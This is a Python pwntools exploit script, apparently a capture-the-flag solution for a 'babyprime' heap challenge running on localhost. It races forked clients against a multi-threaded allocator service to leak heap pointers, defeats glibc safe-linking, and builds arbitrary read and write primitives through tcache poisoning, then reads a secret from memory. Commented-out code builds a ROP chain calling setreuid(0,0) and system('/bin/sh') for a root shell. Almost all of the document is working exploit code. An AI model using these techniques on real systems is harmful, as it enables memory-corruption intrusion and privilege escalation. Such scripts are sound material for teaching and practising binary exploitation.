from pwn import *
import os
import sys
import time

context.arch = 'amd64'
context.log_level = 'error'
libc = ELF("/challenge/lib/libc.so.6")

def mangle(target:int, ptr:int, page_offset=0)->int:
    return target ^ ((ptr >> 12) + page_offset)

def demangle(raw:int, page_offset=0)->int:
    pos = (raw >> 12) + page_offset
    m = pos ^ raw
    return m >> 24 ^ m

def warmup_heap(r):
    r.sendline(b'malloc 8')
    r.sendline(b'malloc 9')
    r.sendline(b'malloc 10')
    r.sendline(b'free 10')
    r.sendline(b'free 9')
    r.sendline(b'free 8')

def get_heap_leak(r1, r2):
    r1.clean()
    r2.clean()
    pid = os.fork()
    if pid == 0:
        # child
        for _ in range(10000):
            r1.sendline(b'malloc 0 scanf 0 AAAAAAAABBBBBBBB free 0')
        sys.exit(0)
    for _ in range(10000):
        r2.sendline(b'printf 0')
    os.wait()
    raw = r2.clean(1)
    for line in raw.splitlines():
        if b'NONE' not in line and b'\x7f' in line:
            leak = line.split(b'MESSAGE: ')[1]
            print(f'mangled leak = {hex(unpack(leak, "all"))}')
            return demangle(unpack(leak, 'all'), page_offset=-2)

idx = 1

def controlled_allocation(r1, r2, addr):
    global idx
    r1.clean()
    r2.clean()

    r1.sendline(f"malloc {idx} malloc {idx+1} free {idx+1}")
    while True:
        pid = os.fork()
        if pid == 0:
            # child
            r1.sendline(f"free {idx}")
            sys.exit(0)
        r2.send((f'scanf {idx} '.encode('utf-8') + p64(addr) + b'\n')*2000)
        os.wait()

        time.sleep(0.1)
        # if we successfully overwrote *next of the top chunk in the bin
        r1.sendline(f'malloc {idx} printf {idx}')
        r1.recvuntil(b'MESSAGE: ')
        result = r1.recvline()[:-1]
        print(f'result = {result}; expected = {p64(addr)}')
        if unpack(result, 'all') == addr:
            break

    r1.sendline(f'malloc {idx+1}')
    r1.clean()
    idx += 2

def arb_read(r1, r2, addr):
    # addr is already mangled
    # 0x20 is bad byte for scanf
    assert 0x20 not in set(p64(addr))

    controlled_allocation(r1, r2, addr)
    r1.sendline(f'printf {idx-1}')
    r1.recvuntil(b'MESSAGE: ')
    result = r1.recvline()[:-1]

    return result

def arb_write(r1, r2, addr, buf):
    # addr is already mangled
    # 0x20 is bad byte for scanf
    assert 0x20 not in set(p64(addr))

    controlled_allocation(r1, r2, addr)
    r1.sendline(f'scanf {idx-1} '.encode('utf-8') + buf)

#b *challenge+1022
#p = gdb.debug("/challenge/babyprime_level8.0", gdbscript=
#"""
#continue
#""")
p = process("/challenge/babyprime_level9.1")
time.sleep(1)

r1 = remote("127.0.0.1", 1337)
r2 = remote("127.0.0.1", 1337)
r3 = remote("127.0.0.1", 1337)
r4 = remote("127.0.0.1", 1337)

warmup_heap(r1)
warmup_heap(r2)
warmup_heap(r3)
warmup_heap(r4)

heap_leak = get_heap_leak(r1, r2)
print(f'heap_leak = {hex(heap_leak)}')
'''
_IO_wfile_jumps_loc = ((heap_leak>>16)<<16) + 0x5a69 - 0x600
mangled_addr = mangle(_IO_wfile_jumps_loc, heap_leak, page_offset=-3)
_IO_wfile_jumps = unpack(arb_read(r1, r2, mangled_addr), 'all')
libc_base = _IO_wfile_jumps - libc.sym['_IO_wfile_jumps'] # 0x2160c0
libc.address = libc_base
print(f'libc_Base = {hex(libc_base)}')

rop = ROP(libc, badchars=b"\x09\x0a\x0b\x0c\x0d\x0e\x20")
bin_sh = next(libc.search(b'/bin/sh'))
rop.setreuid(0, 0)
rop.system(bin_sh)
'''

#rop.call("exit", [42])

#final_payload = rop.chain()
#heap_leak_2 = get_heap_leak(r3, r4)
#ret_inside_printf = libc_base - 33588840 - 0x8 # ends in 0x8, need to align with safe-link
#payload = p64(ret_inside_printf) + rop.chain()
#r5 = remote('127.0.0.1', 1337)
#arb_write(r3, r4, mangle(ret_inside_printf, heap_leak_2, page_offset=-1), payload)

#r5.sendline(b"malloc 12 scanf 12 AAAA printf 12")
#print(r5.clean())

secret_loc = ((heap_leak>>16)<<16) + 0x37d0
mangled_addr = mangle(secret_loc, heap_leak, page_offset=-2)
secret = arb_read(r1, r2, mangled_addr)

#print(f'libc_Base = {hex(libc_base)}')
print(f'heap_leak = {hex(heap_leak)}')
print(f'secret = {secret}')
#print(f'heap_leak_2 = {hex(heap_leak_2)}')
#print(f'ret_inside_printf = {hex(ret_inside_printf)}')
#print(f"Exited: {p.poll()}")
p.interactive()
